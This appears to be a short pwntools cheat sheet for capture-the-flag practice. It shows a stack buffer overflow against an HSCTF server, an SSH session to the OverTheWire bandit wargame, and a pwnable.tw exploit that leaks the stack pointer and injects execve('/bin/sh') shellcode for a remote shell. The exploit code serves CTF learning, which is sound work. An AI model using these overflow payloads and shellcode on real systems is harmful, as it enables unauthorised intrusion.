## Pwntools
A grab-bag of tools to make writing exploits for CTFs easy!


```
nc pwn.hsctf.com 1234
```
```python
from pwn import * 

p = remote('pwn.hsctf.com', 1234)

buf = 'A'*20
win = p32(0x080491b6)
payload = buf + win

p.sendline(payload)
p.interactive()
```

```
ssh bandit@bandit.labs.overthewire.org
```
```python
from pwn import *

session = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0')

io = session.process('sh', env={"PS1":""})
io.sendline('echo Hello, world!')
io.recvline()
# 'Hello, world!\n'
```

```python
from pwn import *

def leak_esp(r):
	address_1 = p32(0x08048087)             # mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; 
	payload = 'A'*20 + address_1
	print r.recvuntil('CTF:')
	r.send(payload)
	esp = u32(r.recv()[:4])
	print "Address of ESP: ", hex(esp)
	return esp

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

if __name__ == "__main__":
    context.arch = 'i386'
    r = remote('chall.pwnable.tw', 10000)
    #gdb.attach(r)
    esp = leak_esp(r)
    payload = "A"*20  + p32(esp + 20) + shellcode 
    r.send(payload)
    r.interactive()
```
